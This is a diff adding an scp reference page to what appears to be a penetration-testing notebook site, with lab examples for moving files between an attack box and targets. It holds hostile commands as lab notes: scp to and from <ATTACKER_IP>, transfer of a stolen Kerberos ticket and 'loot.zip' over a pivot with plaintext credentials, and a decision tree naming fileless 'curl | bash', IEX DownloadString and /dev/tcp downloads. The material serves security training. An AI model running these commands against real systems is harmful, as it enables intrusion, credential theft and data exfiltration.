@@ -9,6 +9,132 @@ hideFooterPagination: true
 
 {/* Generated from Commands/scp.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## scp: choose the operation and read the result
+
+Copy files through SSH.
+
+### What the result establishes
+
+Confirm transfer direction, remote path interpretation, exit status and the destination file's digest.
+
+### Prerequisites and common failures
+
+Local shell expansion and remote path quoting differ; a readable source does not imply a writable destination directory.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+scp ./file.zip USER@TARGET_IP:/tmp/file.zip
+scp USER@TARGET_IP:/tmp/file.zip ./file.zip
+```
+
+### Example 2: SCP (SSH-based Transfer)
+
+Run in: **Saved lab example**.
+
+```bash
+# Enable SSH on your attack box first
+sudo systemctl enable ssh && sudo systemctl start ssh
+
+# From target — download a file from attack box
+scp user@<ATTACKER_IP>:/path/to/file .
+
+# From attack box — upload a file to target
+scp /etc/passwd htb-student@<TARGET_IP>:/home/htb-student/
+```
+
+Saved context: [File Transfers for Linux and Windows — SCP (SSH-based Transfer)](/post-exploitation/file-transfers-cheat-sheet#scp-ssh-based-transfer). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Quick Decision Tree
+
+Run in: **Saved lab example**.
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Step 5 — Transfer the ticket from LINUX01 to Kali
+
+Run in: **Saved lab example**.
+
+```bash
+# [ON KALI]
+scp -P 2222 'david@inlanefreight.htb@10.129.204.23':'/home/david@inlanefreight.htb/julio.ccache' .
+```
+
+Saved context: [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Quick Decision
+
+Run in: **Saved lab example**.
+
+```text
+Windows target → SMB (445)
+Linux target   → SCP/SFTP (22) or NFS (2049)
+No auth needed → FTP anonymous or TFTP
+Web server     → wget / curl
+```
+
+Saved context: [Ports, Protocols, and Services by Purpose — Quick Decision](/reference/master-protocol-service-quick-reference#quick-decision). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: 11. File transfer over a pivot
+
+Run in: **Saved lab example**.
+
+```bash
+# run the SMB/HTTP server on DMZ01 (172.16.119.13), not Kali; then from the internal host:
+net use \\172.16.119.13\share /user:grcan grcan123
+copy C:\loot.zip \\172.16.119.13\share\
+# then pull DMZ01 -> Kali over SSH:  scp jbetty@<DMZ>:/path/loot.zip ~/loot/
+```
+
+Saved context: [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Downloading TO a Linux target
+
+Run in: **Saved lab example**.
+
+```bash
+wget http://<reachable>:8080/tool -O /tmp/tool && chmod +x /tmp/tool
+curl http://<reachable>:8080/tool -o /tmp/tool
+# recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
+scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
+```
+
+Saved context: [Pivoting and File Transfer: Field Reference — Downloading TO a Linux target](/cheatsheets/pivoting-file-transfer#downloading-to-a-linux-target). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Copy files through SSH.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=scp) · [All tools](/index)
@@ -47,6 +173,13 @@ scp user@<ATTACKER_IP>:/path/to/file .
 scp /etc/passwd htb-student@<TARGET_IP>:/home/htb-student/
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SCP (SSH-based Transfer)](/post-exploitation/file-transfers-cheat-sheet#scp-ssh-based-transfer)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
@@ -59,6 +192,13 @@ scp /etc/passwd htb-student@<TARGET_IP>:/home/htb-student/
 # [ON KALI]
 scp -P 2222 'david@inlanefreight.htb@10.129.204.23':'/home/david@inlanefreight.htb/julio.ccache' .
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -74,6 +214,13 @@ curl http://<reachable>:8080/tool -o /tmp/tool
 # recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
 scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Linux target](/cheatsheets/pivoting-file-transfer#downloading-to-a-linux-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -105,6 +252,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 #    Kali:     echo '<paste>' | base64 -d > x
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="File Transfer Protocols">
@@ -119,6 +273,21 @@ Context from the notebook: SCP 22 Secure copy over SSH scp file.txt &lt;user>@&l
 scp file.txt <user>@<IP>:/path/
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — File Transfer Protocols](/reference/master-protocol-service-quick-reference#file-transfer-protocols)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
